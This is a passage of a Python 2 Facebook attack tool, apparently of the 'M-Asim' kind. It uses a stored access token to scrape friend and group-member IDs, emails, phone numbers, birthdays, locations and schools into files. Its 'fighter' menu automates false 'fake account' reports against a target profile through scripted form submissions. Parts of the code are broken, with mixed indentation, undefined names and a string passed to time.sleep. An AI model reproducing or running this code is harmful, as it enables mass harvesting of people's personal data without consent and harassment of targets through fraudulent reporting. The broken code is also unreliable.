            keluar()


def idfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo6
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                asif()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mType File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_idt, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['friends']['data']:
                idfromfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile Save \x1b[1;91m: \x1b[1;97m' + save_idt
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def id_member_grup():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo12
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Group not found'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                asif()

            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mplzz wi8 \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + i['name']
                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def email():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo13
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(em)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except KeyError:
            os.remove(mails)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def emailfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo19
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID Friends \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                asif()

            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromfriends.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;95m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;96m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(emfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def nomor_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo14
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;95m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;96m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Phone\x1b[1;96m%s' % len(hp)
            print '\x1b[1;91m[+] \x1b[1;97mFile saved \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] An error occurred '
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def hpfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo18
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput Friends ID \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Not be friends'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                asif()

            noms = raw_input('\x1b[1;91m[+] \x1b[1;95mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hpfromfriends.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mName\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal number\x1b[1;96m%s' % len(hpfromfriends)
            print '\x1b[1;91m[+] \x1b[1;96mFile saved \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except IOError:
            print '\x1b[1;95m[!] Make file failed'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            asif()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;95m[\xe2\x9c\x96] No connection'
            keluar()

def informasi():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('reset')
	print logo16
	aid = raw_input('\033[1;91m[+] \033[1;92mEnter ID\033[1;97m/\033[1;92mName\033[1;91m : \033[1;97m')
	jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
	r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
	cok = json.loads(r.text)
	for i in cok['data']:
		if aid in i['name'] or aid in i['id']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			print 42*"\033[1;97m♡"
			try:
				print '\033[1;91m[☆] \033[1;92mName\033[1;95m          : '+z['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mName\033[1;97m          : \033[1;91mNot found'
			try:
				print '\033[1;91m[☆] \033[1;92mID\033[1;97m            : '+z['id']
			except KeyError: print '\033[1;91m[?] \033[1;92mID\033[1;92m            : \033[1;91mNot found'
			try:
				print '\033[1;91m[☆] \033[1;92mEmail\033[1;97m         : '+z['email']
			except KeyError: print '\033[1;91m[?] \033[1;92mEmail\033[1;96m         : \033[1;91mNot found'
			try:
				print '\033[1;91m[☆] \033[1;92mTelephone\033[1;95m     : '+z['mobile_phone']
			except KeyError: print '\033[1;91m[?] \033[1;92mTelephone\033[1;97m     : \033[1;91mNot found'
			try:
				print '\033[1;91m[☆] \033[1;92mLocation\033[1;97m      : '+z['location']['name']
			except KeyError: print '\033[1;91m[?] \033[1;92mLocation\033[1;93m      : \033[1;91mNot found'
			try:
				print '\033[1;91m[☆] \033[1;92mDate of birth\033[1;91m : '+z['birthday']
			except KeyError: print '\033[1;91m[?] \033[1;92mDate of birth\033[1;97m : \033[1;91mNot found'
			try:
				print '\033[1;91m[☆] \033[1;92mSchool\033[1;97m        : '
				for q in z['education']:
					try:
						print '\033[1;91m                   ~ \033[1;92m'+q['school']['name']
					except KeyError: print '\033[1;91m                   ~ \033[1;91mNot found'
			except KeyError: pass
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			asif()
		else:
			pass
	else:
		print"\033[1;91m[✖] User not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()

def fighter():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo23
	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;92m Target Profile.  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;92m Start  Reporting."
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;92m Start  Report1.  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m4.\x1b[1;92m Start  Report2.  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m5.\x1b[1;92m Start  Report3.  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m6.\x1b[1;92m Start  Report4.  "
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Back             "
	pilih_fighter()

def pilih_fighter():
	peak = raw_input("\n\033[1;91mEnter Number>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_fighter()
	elif peak =="1":
		report()
        elif peak =="2":
	        rep()
        elif peak =="3":
                test1()
        elif peak =="4":
	        test2()
        elif peak =="5":
	        test3()
        elif peak =="6":
	        test4()
	elif peak =="0":
		menu()
def report():
    try:
        os.system('clear')
        print logo3
        id = raw_input(R+'[+]'+G+' Enter Target Id: '+W)
        my = ("https://m.facebook.com/"+id)
        url = my
        br.open(url)
        dray = raw_input(R+'[*] '+G+'Do You Want To Report \n'+R+'[+]'+G+' [y/n] :\n'+ G +' M-Asim ' + R + '  ' + W)
        return rep()    
    except:
        fighter()
def rep():
    x = open(ids,'r')
    y = x.read()
    if id in y:
        print (R+'.  Oops 405')
        time.sleep(1)
        time.sleep(R+'Error While Reporting the Id')
        time.sleep(1)
        return test1()
    else:         
        return test2()
               
def test1():
          _bs = br.response().read()
          bb=bs4.BeautifulSoup(_bs,
				features="html.parser"
			)
          if len(bb) !=0:              
              for x in bb.find_all("a",href=True):                  
                  if "rapid_report" in x["href"]:                      
                      _cadow = x["href"]                      
                      br.open(_cadow)
                      return test2()
          
def test2():
    try:
        br._factory.is_html=True
        br.select_form(nr=0)
        br.form["tag"] = ["profile_fake_account"]
        br.submit()
        return test3()
    except Exception as f:
        print (' [+] Bad404')
                
def test3():     
    try:         
        br._factory.is_html=True
        br.select_form(nr=0)
        br.form["action_key"] = ["FRX_PROFILE_REPORT_CONFIRMATION"]
        br.submit()
        return _test4()
    except Exception as f:         
        print ('    Bad405')
                 
def test4():     
    try:         
        br._factory.is_html=True
        br.select_form(nr=0)
        br.form["checked"] = ["yes"]
        br.submit()
        jj = open(ids,'w')
        jj.write(_id)
        print ''
        time.sleep(2)
        print (G+'[-]Reported ')
        time.sleep(1)
        exit()
    except Exception as f:         
        print ('    Bad406')
		
          
if __name__ == '__main__':
	login()
